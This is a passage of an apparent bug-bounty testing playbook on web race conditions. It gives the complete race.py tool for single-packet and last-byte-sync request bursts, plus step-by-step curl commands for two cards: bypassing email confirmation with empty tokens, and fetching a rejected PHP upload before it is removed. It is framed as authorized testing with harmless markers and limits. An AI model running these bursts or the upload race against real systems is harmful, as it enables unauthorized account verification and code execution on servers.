      if each: n, _, w = each[i % len(each)].partition(':'); h = [x for x in h if x[0] != n.strip().lower()] + [(n.strip().lower(), w.strip())]
      R.append((t[0].upper(), parse.urlsplit(t[1].replace('{i}', str(i))), [(k, v.replace('{i}', str(i))) for k, v in h if k not in DROP], b))
  u0, N, res = R[0][1], len(R), [dict(st='-', hd=[], body=b'', t0=0, t1=0, t2=0) for _ in R]
  if any(r[1][:2] != u0[:2] for r in R): sys.exit('race.py: all requests must go to one origin')
  TLS, TO, RATE, GAP = (u0.scheme == 'https'), float(o['--timeout']), float(os.environ.get('RATE') or 1), float(o['--stagger']) / 1000
  def path(u): return (u[2] or '/') + ('?' + u[3] if u[3] else '')  # path and query of a split URL
  def conn(alpn):
      s = socket.create_connection((u0.hostname, (u0.port or (443 if TLS else 80))), timeout=TO)
      s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
      if not TLS: return s
      cx = ssl.create_default_context(); cx.set_alpn_protocols([alpn])
      if '-k' in fl: cx.check_hostname, cx.verify_mode = False, ssl.CERT_NONE
      return cx.wrap_socket(s, server_hostname=u0.hostname)
  def h2run():
      from h2 import config, connection, events as ev
      s = conn('h2')
      if TLS and s.selected_alpn_protocol() != 'h2': sys.exit('race.py: the server did not negotiate HTTP/2: use --h1')
      c = connection.H2Connection(config.H2Configuration(client_side=True, header_encoding='utf-8'))
      c.initiate_connection(); s.sendall(c.data_to_send()); rec, flag = {}, set()
      def pump(done, limit):
          end = time.time() + limit
          while not done() and time.time() < end and 'gone' not in flag:
              s.settimeout(max(0.05, end - time.time()))
              try: data = s.recv(65536)
              except (socket.timeout, TimeoutError): break
              if not data: flag.add('gone'); break
              for e in c.receive_data(data):
                  r = rec.get(getattr(e, 'stream_id', None))
                  if isinstance(e, ev.ResponseReceived) and r: r.update(t1=time.time(), hd=e.headers, st=dict(e.headers)[':status'])
                  elif isinstance(e, ev.DataReceived):
                      if r: r['body'] += bytes(e.data)
                      c.acknowledge_received_data(e.flow_controlled_length, e.stream_id)
                  elif isinstance(e, ev.StreamEnded) and r: r['t2'] = time.time()
                  elif isinstance(e, ev.StreamReset) and r: r.update(t2=time.time(), st='RST')
                  elif isinstance(e, ev.PingAckReceived): flag.add('pong')
                  elif isinstance(e, ev.RemoteSettingsChanged): flag.add('settings')
                  elif isinstance(e, ev.ConnectionTerminated): flag.add('gone')
              s.sendall(c.data_to_send())
      def start(m, u, h, b, r, end=False):
          sid, cl = c.get_next_available_stream_id(), [('content-length', str(len(b)))] if b or m in ('POST', 'PUT', 'PATCH') else []
          rec[sid] = r; c.send_headers(sid, [(':method', m), (':authority', u.netloc), (':scheme', u.scheme), (':path', path(u))] + h + cl, end_stream=end)
          return sid
      def data(sid, b, end):
          mx = c.max_outbound_frame_size; ch = [b[j:j + mx] for j in range(0, len(b), mx)] or [b'']
          for j, x in enumerate(ch):
              if x or end: c.send_data(sid, x, end_stream=end and j == len(ch) - 1)
      pump(lambda: 'settings' in flag, 5)
      if 'settings' not in flag: sys.exit('race.py: no HTTP/2 SETTINGS frame from the server: use --h1')
      if o['--warm']:  # three GETs on this connection first, so that the burst does not pay for a cold connection
          w = [dict(st='-', hd=[], body=b'', t0=0, t1=0, t2=0) for _ in range(3)]
          for r in w: start('GET', u0._replace(path=o['--warm'], query=''), [x for x in hd if x[0] not in DROP], b'', r, True)
          s.sendall(c.data_to_send()); pump(lambda: all(r['t2'] for r in w), TO)
      if sum(len(x[3]) for x in R) > 60000: sys.exit('race.py: the bodies exceed one flow-control window: keep them small')
      sids = [start(*x, r) for x, r in zip(R, res)]
      for sid, x in zip(sids, R): data(sid, x[3][:-1], False)
      s.sendall(c.data_to_send()); c.ping(b'race.py!'); s.sendall(c.data_to_send()); pump(lambda: 'pong' in flag, 5)
      last = []
      for sid, x in zip(sids, R): data(sid, x[3][-1:], True); last.append(c.data_to_send())
      if GAP:
          for q, r in zip(last, res): r['t0'] = time.time(); s.sendall(q); time.sleep(GAP)
      else:
          t0 = time.time(); s.sendall(b''.join(last))
          for r in res: r['t0'] = t0
      pump(lambda: all(r['t2'] for r in res), TO)
  def h1run():
      def rd(s, r):
          buf = b''
          while True:
              try: x = s.recv(65536)
              except OSError: break
              if not x: break
              buf, r['t1'] = buf + x, r['t1'] or time.time()
          head, _, r['body'] = buf.partition(b'\r\n\r\n'); ln = head.decode('latin-1').split('\r\n')
          r.update(t2=time.time(), st=(ln[0].split(' ') + ['-', '-'])[1], hd=[tuple(x.split(': ', 1)) for x in ln[1:] if ': ' in x])
      socks = []
      for m, u, h, b in R:
          ln = ['%s %s HTTP/1.1' % (m, path(u)), 'host: ' + u.netloc] + ['%s: %s' % x for x in h] + ['connection: close']
          q = ('\r\n'.join(ln + (['content-length: %d' % len(b)] if b or m in ('POST', 'PUT', 'PATCH') else [])) + '\r\n\r\n').encode() + b
          s = conn('http/1.1'); s.sendall(q[:-1]); socks.append((s, q[-1:]))
      th = [threading.Thread(target=rd, args=(s, r)) for (s, _), r in zip(socks, res)]
      for t in th: t.start()
      time.sleep(0.3)  # HTTP/1.1 has no PING: give the partial requests time to arrive
      for (s, q), r in zip(socks, res): r['t0'] = time.time(); s.sendall(q); time.sleep(GAP)
      for t in th: t.join(TO)
  h1run() if '--h1' in fl else h2run()
  print('# %d requests released %s over %s, %s' % (N, '%s ms apart' % o['--stagger'] if GAP else 'together', 'HTTP/1.1' if '--h1' in fl else 'HTTP/2', time.strftime('%H:%M:%S')))
  seen = Counter()
  for i, ((m, u, h, b), r) in enumerate(zip(R, res)):
      snip, ms = re.sub(r'\s+', ' ', r['body'][:100].decode('utf-8', 'replace')), '%8.1f' % ((r['t1'] - r['t0']) * 1000) if r['t1'] else '       -'
      print('%3d %-4s %7d %s ms  %s %s  %s' % (i, r['st'], len(r['body']), ms, m, path(u)[:40], snip[:70]))
      seen[(r['st'], re.sub(r'[0-9a-f]{8,}|\d+', '#', snip[:60]))] += 1
      if o['--out']:
          os.makedirs(o['--out'], exist_ok=True); hh = ''.join('%s: %s\n' % x for x in r['hd'])
          open(os.path.join(o['--out'], '%02d.txt' % i), 'wb').write(('%s %s\n' % (m, u.geturl())).encode() + b + ('\n\n%s\n%s\n' % (r['st'], hh)).encode() + r['body'])
  print('# outcomes (digits and hex ids folded):')
  for k, v in seen.most_common(): print('%5d x %-4s %s' % (v, k[0], k[1]))
  print('# ms from release to first response byte, sorted: ' + ' '.join('%.0f' % x for x in sorted((r['t1'] - r['t0']) * 1000 for r in res if r['t1'])))
  time.sleep(N / RATE)
  PY
  # sessions FILE PATH BODY: twenty logins with the saved login request, one Cookie line per session, for race.py --each FILE
  sessions(){ for i in $(seq 1 20); do curl -sS "${HDR[@]}" -c "$1.jar" -o /dev/null -X POST "$T$2" -H "Content-Type: ${LOGIN_CT:-application/json}" -d "$3"
    printf 'Cookie: %s\n' "$(sed 's/^#HttpOnly_//' "$1.jar" | grep -v '^#' | awk 'NF>=7{printf "%s%s=%s", s, $6, $7; s="; "}')"; rm -f "$1.jar"; sleep 1; done > "$1"; }
  ```
  ```bash
  D="$E/evidence/$H/RAC-009"; mkdir -p "$D"; CT='Content-Type: application/json'
  Y='<fresh address of ours at our domain; its mailbox stays closed>'; U='<an unconfirmed account of ours>'
  # 1. control: the empty spellings against an account that already exists unconfirmed must all be refused
  curl -sS "${HDR[@]}" -o /dev/null -w "%{http_code} token=\n" "$T/confirm?email=$U&token="; sleep 1
  for v in null '""' '[]'; do curl -sS "${HDR[@]}" -X POST "$T/api/confirm" -H "$CT" -d "{\"email\":\"$U\",\"token\":$v}" -o /dev/null -w "%{http_code} $v\n"; sleep 1; done
  # 2. the registration of Y released first, then twenty empty-secret confirms 2 ms apart (--h1 without HTTP/2)
  python3 "$E/tools/race.py" "${HDR[@]}" -H "$CT" --stagger 2 --out "$D/burst-1" \
    -- 1 POST "$T/api/register" "{\"email\":\"$Y\",\"password\":\"Rac009-pw-1!\"}" -- 5 GET "$T/confirm?email=$Y&token=" \
    -- 5 POST "$T/api/confirm" "{\"email\":\"$Y\",\"token\":null}" -- 5 POST "$T/api/confirm" "{\"email\":\"$Y\",\"token\":\"\"}" \
    -- 5 POST "$T/api/confirm" "{\"email\":\"$Y\",\"token\":[]}" | tee "$D/burst-1.txt"
  # 3. sign in as Y and read its state: verified, although no mail to Y was opened?
  curl -sS "${HDR[@]}" -c "$D/y.jar" -o /dev/null -X POST "$T/api/login" -H "$CT" -d "{\"email\":\"$Y\",\"password\":\"Rac009-pw-1!\"}"
  curl -sS "${HDR[@]}" -b "$D/y.jar" "$T/api/me" | grep -oE '"(email|email_verified|verified|confirmed_at)":[^,}]*'
  # 4. an API key created by A, released with twenty calls that carry an empty key and no session of A:
  #    request 0 gets A's Cookie line, the others a dummy cookie (an Authorization-header API: use those lines instead)
  { grep -i '^cookie:' "$E/accounts/A.headers"; for i in $(seq 1 20); do echo 'Cookie: rac009=none'; done; } > "$D/key-each.txt"
  python3 "$E/tools/race.py" "${HDR[@]}" -H "$CT" --each "$D/key-each.txt" --stagger 2 --out "$D/burst-key" \
    -- 1 POST "$T/api/keys" '{"name":"rac009"}' -- 20 GET "$T/api/me?api_key=" | tee "$D/burst-key.txt"
  # the rate: steps 2 and 3 again with a fresh address each time, five bursts at most; delete the accounts and the key afterwards
  ```
- **Proof:** account Y verified although Y's mailbox was never opened, with the burst line that returned the
  success; or an authenticated answer for the new object obtained with an empty key; the control showing the same
  empty spellings refused outside the window; the rate over the runs.
- **Not a finding when:** the empty spellings are refused during creation as they are outside it (validation
  rejects arrays and null before the lookup); the account was confirmed by its real token; a generic success page
  with no change in state; the control itself succeeds: then the bug is not a race and belongs to AUT-014 or
  API-009 (a secret comparison that passes on a value that is not a string).
- **Escalate:** a verified address we never opened has the consequences of RAC-006 and AUT-014. An API key or an
  invitation usable during its creation matters for victims only where the attacker starts the creation (an
  invitation sent to an address, a registration of an address); show that flow with our own addresses.

### RAC-010 · An uploaded file the validator rejects can be fetched from its storage URL before the rejection removes it

| | |
|---|---|
| **Severity** | High standalone when the window executes a script on the application host (Critical when the upload needs no account); Medium when a rejected HTML or SVG file stays stored and is served from the target's origin; Low for a transient window with no executing handler |
| **Requires** | upload |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Time-of-check Time-of-use (TOCTOU) Race Condition · CWE-367, CWE-434 |
| **Prior art** | #3923967, #214028 |

- **Where:** uploads stored where they are served before they are checked: avatars, attachments, imports, media
  libraries, theme or plugin uploads. Best when the stored name is predictable (the original name, a timestamp, a
  counter) and validation runs after the write (an antivirus scan, an image re-encode, an extension check after
  the file was moved). Upload an allowed file first to learn the URL pattern; a random name returned only after
  validation makes the race impossible: mark the card negative with that reason.
- **Test:** the server writes the upload to its final place, then validates and deletes it. A request for the file
  between the write and the delete is served, and executed where the path maps to an interpreter. Release the
  upload of a file the validator rejects, followed by twenty requests for its predicted URL, 5 ms apart.
- **How:** the first block is the same in every RAC card; the second holds this card's steps, with the saved
  requests in place of the example paths. The script prints a fixed marker and does nothing else.
  ```bash
  # 0. race.py and sessions(): this block is the same in every RAC card; race.py is written once per engagement
  mkdir -p "$E/tools"; [ -s "$E/tools/race.py" ] || cat > "$E/tools/race.py" <<'PY'
  # race.py: release up to 50 requests together and print what each returned (needs: python3 -m pip install --user h2).
  # HTTP/2 (default) is the single-packet attack: all requests go out but their last byte, a PING round trip shows the server
  # has read them, then every last byte leaves in one write. --h1 is last-byte sync: one connection per request.
  # race.py [-n 20] [--h1] [--warm PATH] [--stagger MS] [--each FILE] [--out DIR] [-k] [curl -A/-H args] -- [COUNT] METHOD URL [BODY|@file] [-- ...]
  # Templates without COUNT repeat in turn up to -n; {i} (URL, body, header) is the request number; --each gives request i the header on line i
  # of FILE (a session per request); --stagger releases them MS ms apart. Afterwards it sleeps n/$RATE s for the rate limit.
  import os, re, socket, ssl, sys, threading, time
  from collections import Counter
  from urllib import parse
  a, o, fl, hd = sys.argv[1:], {'-n': '20', '--warm': '', '--stagger': '0', '--each': '', '--out': '', '--timeout': '20'}, set(), []
  while a and a[0] != '--':
      k = a.pop(0)
      if k in ('--h1', '-k'): fl.add(k); continue
      if k not in o and k not in ('-A', '-H'): sys.exit('race.py: unknown option ' + k)
      v = a.pop(0)
      if k in o: o[k] = v; continue
      for ln in ['User-Agent: ' + v] if k == '-A' else open(v[1:]).read().splitlines() if v[:1] == '@' else [v]:
          n, _, w = ln.partition(':')
          if n.strip() and w.strip(): hd.append((n.strip().lower(), w.strip()))
  tpl, cnt = [t.split('\0') for t in '\0'.join(a[1:]).split('\0--\0') if t], lambda t: int(t[0]) if t[0].isdigit() else 0
  seq = [t[1:] if cnt(t) else t for t in tpl for _ in range(cnt(t) or 1)] if any(map(cnt, tpl)) else [tpl[i % len(tpl)] for i in range(int(o['-n']) * bool(tpl))]
  if not 0 < len(seq) <= 50: sys.exit('race.py: give 1 to 50 requests after --; more is load, not a race')
  each, R = [x for x in open(o['--each']) if ':' in x] if o['--each'] else [], []
  DROP = {'host', 'connection', 'keep-alive', 'proxy-connection', 'transfer-encoding', 'upgrade', 'te', 'content-length'}
  for i, t in enumerate(seq):
      b, h = t[2] if len(t) > 2 else '', list(hd)
      b = (open(b[1:], 'rb').read() if b[:1] == '@' else b.encode()).replace(b'{i}', str(i).encode())
      if each: n, _, w = each[i % len(each)].partition(':'); h = [x for x in h if x[0] != n.strip().lower()] + [(n.strip().lower(), w.strip())]
      R.append((t[0].upper(), parse.urlsplit(t[1].replace('{i}', str(i))), [(k, v.replace('{i}', str(i))) for k, v in h if k not in DROP], b))
  u0, N, res = R[0][1], len(R), [dict(st='-', hd=[], body=b'', t0=0, t1=0, t2=0) for _ in R]
  if any(r[1][:2] != u0[:2] for r in R): sys.exit('race.py: all requests must go to one origin')
  TLS, TO, RATE, GAP = (u0.scheme == 'https'), float(o['--timeout']), float(os.environ.get('RATE') or 1), float(o['--stagger']) / 1000
  def path(u): return (u[2] or '/') + ('?' + u[3] if u[3] else '')  # path and query of a split URL
  def conn(alpn):
      s = socket.create_connection((u0.hostname, (u0.port or (443 if TLS else 80))), timeout=TO)
      s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
      if not TLS: return s
      cx = ssl.create_default_context(); cx.set_alpn_protocols([alpn])
      if '-k' in fl: cx.check_hostname, cx.verify_mode = False, ssl.CERT_NONE
      return cx.wrap_socket(s, server_hostname=u0.hostname)
  def h2run():
      from h2 import config, connection, events as ev
      s = conn('h2')
      if TLS and s.selected_alpn_protocol() != 'h2': sys.exit('race.py: the server did not negotiate HTTP/2: use --h1')
      c = connection.H2Connection(config.H2Configuration(client_side=True, header_encoding='utf-8'))
      c.initiate_connection(); s.sendall(c.data_to_send()); rec, flag = {}, set()
      def pump(done, limit):
          end = time.time() + limit
          while not done() and time.time() < end and 'gone' not in flag:
              s.settimeout(max(0.05, end - time.time()))
              try: data = s.recv(65536)
              except (socket.timeout, TimeoutError): break
              if not data: flag.add('gone'); break
              for e in c.receive_data(data):
                  r = rec.get(getattr(e, 'stream_id', None))
                  if isinstance(e, ev.ResponseReceived) and r: r.update(t1=time.time(), hd=e.headers, st=dict(e.headers)[':status'])
                  elif isinstance(e, ev.DataReceived):
                      if r: r['body'] += bytes(e.data)
                      c.acknowledge_received_data(e.flow_controlled_length, e.stream_id)
                  elif isinstance(e, ev.StreamEnded) and r: r['t2'] = time.time()
                  elif isinstance(e, ev.StreamReset) and r: r.update(t2=time.time(), st='RST')
                  elif isinstance(e, ev.PingAckReceived): flag.add('pong')
                  elif isinstance(e, ev.RemoteSettingsChanged): flag.add('settings')
                  elif isinstance(e, ev.ConnectionTerminated): flag.add('gone')
              s.sendall(c.data_to_send())
      def start(m, u, h, b, r, end=False):
          sid, cl = c.get_next_available_stream_id(), [('content-length', str(len(b)))] if b or m in ('POST', 'PUT', 'PATCH') else []
          rec[sid] = r; c.send_headers(sid, [(':method', m), (':authority', u.netloc), (':scheme', u.scheme), (':path', path(u))] + h + cl, end_stream=end)
          return sid
      def data(sid, b, end):
          mx = c.max_outbound_frame_size; ch = [b[j:j + mx] for j in range(0, len(b), mx)] or [b'']
          for j, x in enumerate(ch):
              if x or end: c.send_data(sid, x, end_stream=end and j == len(ch) - 1)
      pump(lambda: 'settings' in flag, 5)
      if 'settings' not in flag: sys.exit('race.py: no HTTP/2 SETTINGS frame from the server: use --h1')
      if o['--warm']:  # three GETs on this connection first, so that the burst does not pay for a cold connection
          w = [dict(st='-', hd=[], body=b'', t0=0, t1=0, t2=0) for _ in range(3)]
          for r in w: start('GET', u0._replace(path=o['--warm'], query=''), [x for x in hd if x[0] not in DROP], b'', r, True)
          s.sendall(c.data_to_send()); pump(lambda: all(r['t2'] for r in w), TO)
      if sum(len(x[3]) for x in R) > 60000: sys.exit('race.py: the bodies exceed one flow-control window: keep them small')
      sids = [start(*x, r) for x, r in zip(R, res)]
      for sid, x in zip(sids, R): data(sid, x[3][:-1], False)
      s.sendall(c.data_to_send()); c.ping(b'race.py!'); s.sendall(c.data_to_send()); pump(lambda: 'pong' in flag, 5)
      last = []
      for sid, x in zip(sids, R): data(sid, x[3][-1:], True); last.append(c.data_to_send())
      if GAP:
          for q, r in zip(last, res): r['t0'] = time.time(); s.sendall(q); time.sleep(GAP)
      else:
          t0 = time.time(); s.sendall(b''.join(last))
          for r in res: r['t0'] = t0
      pump(lambda: all(r['t2'] for r in res), TO)
  def h1run():
      def rd(s, r):
          buf = b''
          while True:
              try: x = s.recv(65536)
              except OSError: break
              if not x: break
              buf, r['t1'] = buf + x, r['t1'] or time.time()
          head, _, r['body'] = buf.partition(b'\r\n\r\n'); ln = head.decode('latin-1').split('\r\n')
          r.update(t2=time.time(), st=(ln[0].split(' ') + ['-', '-'])[1], hd=[tuple(x.split(': ', 1)) for x in ln[1:] if ': ' in x])
      socks = []
      for m, u, h, b in R:
          ln = ['%s %s HTTP/1.1' % (m, path(u)), 'host: ' + u.netloc] + ['%s: %s' % x for x in h] + ['connection: close']
          q = ('\r\n'.join(ln + (['content-length: %d' % len(b)] if b or m in ('POST', 'PUT', 'PATCH') else [])) + '\r\n\r\n').encode() + b
          s = conn('http/1.1'); s.sendall(q[:-1]); socks.append((s, q[-1:]))
      th = [threading.Thread(target=rd, args=(s, r)) for (s, _), r in zip(socks, res)]
      for t in th: t.start()
      time.sleep(0.3)  # HTTP/1.1 has no PING: give the partial requests time to arrive
      for (s, q), r in zip(socks, res): r['t0'] = time.time(); s.sendall(q); time.sleep(GAP)
      for t in th: t.join(TO)
  h1run() if '--h1' in fl else h2run()
  print('# %d requests released %s over %s, %s' % (N, '%s ms apart' % o['--stagger'] if GAP else 'together', 'HTTP/1.1' if '--h1' in fl else 'HTTP/2', time.strftime('%H:%M:%S')))
  seen = Counter()
  for i, ((m, u, h, b), r) in enumerate(zip(R, res)):
      snip, ms = re.sub(r'\s+', ' ', r['body'][:100].decode('utf-8', 'replace')), '%8.1f' % ((r['t1'] - r['t0']) * 1000) if r['t1'] else '       -'
      print('%3d %-4s %7d %s ms  %s %s  %s' % (i, r['st'], len(r['body']), ms, m, path(u)[:40], snip[:70]))
      seen[(r['st'], re.sub(r'[0-9a-f]{8,}|\d+', '#', snip[:60]))] += 1
      if o['--out']:
          os.makedirs(o['--out'], exist_ok=True); hh = ''.join('%s: %s\n' % x for x in r['hd'])
          open(os.path.join(o['--out'], '%02d.txt' % i), 'wb').write(('%s %s\n' % (m, u.geturl())).encode() + b + ('\n\n%s\n%s\n' % (r['st'], hh)).encode() + r['body'])
  print('# outcomes (digits and hex ids folded):')
  for k, v in seen.most_common(): print('%5d x %-4s %s' % (v, k[0], k[1]))
  print('# ms from release to first response byte, sorted: ' + ' '.join('%.0f' % x for x in sorted((r['t1'] - r['t0']) * 1000 for r in res if r['t1'])))
  time.sleep(N / RATE)
  PY
  # sessions FILE PATH BODY: twenty logins with the saved login request, one Cookie line per session, for race.py --each FILE
  sessions(){ for i in $(seq 1 20); do curl -sS "${HDR[@]}" -c "$1.jar" -o /dev/null -X POST "$T$2" -H "Content-Type: ${LOGIN_CT:-application/json}" -d "$3"
    printf 'Cookie: %s\n' "$(sed 's/^#HttpOnly_//' "$1.jar" | grep -v '^#' | awk 'NF>=7{printf "%s%s=%s", s, $6, $7; s="; "}')"; rm -f "$1.jar"; sleep 1; done > "$1"; }
  ```
  ```bash
  D="$E/evidence/$H/RAC-010"; mkdir -p "$D"; BD='rac010boundary'
  # 1. an allowed file first: where it lands and under which name
  printf 'rac010 allowed\n' > "$D/rac010.txt"
  curl -sS "${HDR[@]}" $A -X POST "$T/api/upload" -F "file=@$D/rac010.txt;type=text/plain" -D- -o "$D/allowed.json"
  grep -oE '"(url|path|location|file_url|key)"\s*:\s*"[^"]+' "$D/allowed.json"
  # 2. the rejected file: on a PHP stack a script that prints rac010-42 (arithmetic only); elsewhere an HTML marker
  printf '<?php echo "rac010-" . (6 * 7);\n' > "$D/rac010.php"
  { printf -- '--%s\r\nContent-Disposition: form-data; name="file"; filename="rac010.php"\r\nContent-Type: application/x-php\r\n\r\n' "$BD"
    cat "$D/rac010.php"; printf '\r\n--%s--\r\n' "$BD"; } > "$D/upload.body"
  # 3. the upload released first, then twenty requests for the predicted URL 5 ms apart (100 ms of window; --h1 without HTTP/2)
  python3 "$E/tools/race.py" "${HDR[@]}" $A -H "Content-Type: multipart/form-data; boundary=$BD" --stagger 5 --out "$D/burst-1" \
    -- 1 POST "$T/api/upload" @"$D/upload.body" -- 20 GET "$T/uploads/rac010.php" | tee "$D/burst-1.txt"
  grep -l 'rac010-42' "$D"/burst-1/*.txt; grep -l '<?php' "$D"/burst-1/*.txt    # executed / served as source
  # 4. a minute later: gone (a window) or still there (the rejection did not remove it)?
  sleep 60; curl -sS "${HDR[@]}" -o /dev/null -w 'one minute later: %{http_code}\n' "$T/uploads/rac010.php"
  # the rate: step 3 up to five times; a 10 ms stagger reaches 200 ms when the scan is slow. Remove any file that stayed
  ```
- **Proof:** an answer in the burst containing the marker the server computed (`rac010-42`, not the source text),
  in the same burst as the upload's rejection, and a later request showing the file gone; or, for the persistent
  case, the rejected file still served from the target's origin a minute later. With the rate over the runs. One
  marker and nothing else; the file is removed once the evidence is saved.
- **Not a finding when:** the answers carry the source text (no handler maps the path, so the window exposes our
  own file and nothing more); the file is served from a separate sandbox domain or as an attachment
  (`Content-Disposition: attachment`); uploads go to object storage under a quarantine key and move only after the scan; the `200`
  answers are a catch-all page (compare with a random path); the upload directory does not execute scripts.
- **Escalate:** execution follows the RCE chapter's rules: one harmless marker, then stop. A rejected HTML or SVG
  file that stays on the target's origin is stored XSS (XSS chapter). File-name collisions between two users'
  concurrent imports (#214028) are tested between A and B (BAC chapter). A persistent write through a processing
  race in a known product (#3923967) belongs with the CVE chapter for that product.

## Graveyard

- **Plan-limit and count races with nothing priced behind them.** A sixth workspace, an eleventh API key, more
  store locations: low at best. Shopify's note on #413759 says it no longer accepts plan-limit race reports, and
  other policies say the same; read the policy before RAC-004.
- **Promotion, trial and referral races** where the policy excludes promotions (`promo-abuse`): the planner closes
  RAC-002. Obtaining a second grant through extra accounts is multi-accounting, a fraud-team matter, not a race.
- **Votes, likes, follows, reviews and survey answers counted twice.** Low or informative unless the count is paid
  out or ranks something with money behind it (`rate-limit` where the policy files it there).
- **Duplicate display names.** Two organisations or projects with one name: #3248712 was titled "Not a Vuln" and
  closed as not applicable.
- **A verification race that ends in nothing trusted.** An address of ours confirmed without its link, a
  verification step skipped that no feature depends on: #3020733 was closed as informative. Show what trusts the
  address first.
- **Twenty `200` answers and one change in state.** An idempotent handler, or an idempotency key that deduplicated
  the burst. The state decides, not the status codes.
- **Volume as the proof.** Thousands of requests, a "race condition" whose impact is an outage (#249319), a limiter
  tripped by the burst: (`dos`), and outside the rules of this repository.
- **A session that survives logout because a request was in flight** (#340191, accepted as low): (`session-expiry`)
  on most programmes.
- **A race that needs the victim to act in the same millisecond** (someone else's registration, payment or login).
  Not a report; prove races only between our own accounts, in requests the attacker controls.
- **Races in browser code** (a form handler on the page, #381356): low, and rarely more.
- **Library and runtime TOCTOU** (curl, Node.js, the Rust standard library): reported to their own programmes with
  a local proof, not as findings on a web target that merely uses the library (`third-party`).
- **One win in hundreds of bursts with low impact.** `AC:H` and low; bursting more to improve the odds breaks the
  scale rule.
- **The same over-limit result filed twice**, once as logic and once as race. One root cause, one report.

## Chains

- RAC-001 → every card: the transport and the session lock decide `--h1` and `--each`.
- RAC-002, RAC-004 ↔ BIZ-005, BIZ-006, BIZ-011, BIZ-012: the sequential forms of the same "once" and "at most N";
  report the root cause once.
- RAC-003 → BIZ-010 (one of the duplicated purchases refunded), BIZ-007 (an order activated from a cart larger
  than its payment).
- RAC-005 + AUT-010, GQL-007 → AUT-008: the counter raced, keyed on a client value or batched; with
  `bruteforce-ok`, the code space falls.
- AUT-016 → RAC-005: a pre-login session that survives login opens the moment between "user stored" and "second
  factor required".
- RAC-006, RAC-009 → AUT-014, BIZ-015 → OAU (relying parties that match on e-mail) and BAC (domain auto-join,
  invitations matched by address): an address verified without its mailbox.
- RAC-007 → AUT-004, AUT-002: the token's lifecycle and predictability; a collision is the shortcut to both.
- RAC-004 → BAC-015, BAC-017: a single-use invitation redeemed twice or into the wrong account; duplicate
  memberships from one burst that outlive a removal.
- RAC-008 → AUT-012, AUT-013: duplicates of one identity, then an SSO login that picks one.
- RAC-009 → API-009: an empty or non-string secret accepted outside any race is the API chapter's finding.
- RAC-010 → RCE chapter (a script that runs once), XSS chapter (a rejected HTML or SVG file kept on the target's
  origin), UPL chapter.
- GQL-007 → RAC-002 to RAC-005: an alias or array batch is a burst inside one request; some servers run batch
  entries concurrently.

## Sources

- `kb/reports/race.md` and `kb/reports/all/race.md`: the disclosed reports this chapter is built from.
- HexBrain: `get_testing_playbook {"topic":"Race Condition"}`, `find_payloads {"topic":"Race Condition"}`.
- James Kettle, "Smashing the state machine: the true potential of web race conditions", PortSwigger Research
  (2023): the single-packet attack, last-byte synchronisation, connection warming, session-based locking,
  multi-endpoint, single-endpoint and partial-construction races.
- PortSwigger Web Security Academy, Race conditions: limit overrun, multi-endpoint, single-endpoint,
  partial-construction and time-sensitive races.
- Tom Van Goethem, Christina Pöpper, Wouter Joosen, Mathy Vanhoef, "Timeless Timing Attacks: Exploiting Concurrency
  to Leak Secrets over Remote Connections", USENIX Security 2020: the concurrency idea the single-packet attack
  builds on.
- RFC 9113 (HTTP/2), §6.1 DATA (the END_STREAM flag `race.py` withholds) and §6.7 PING (the round trip it uses
  before the release); RFC 6749 §4.1.2 (an authorization code used twice must be refused).
- OWASP WSTG-BUSL-05, Test Number of Times a Function Can Be Used Limits; CWE-362, CWE-367, CWE-662.
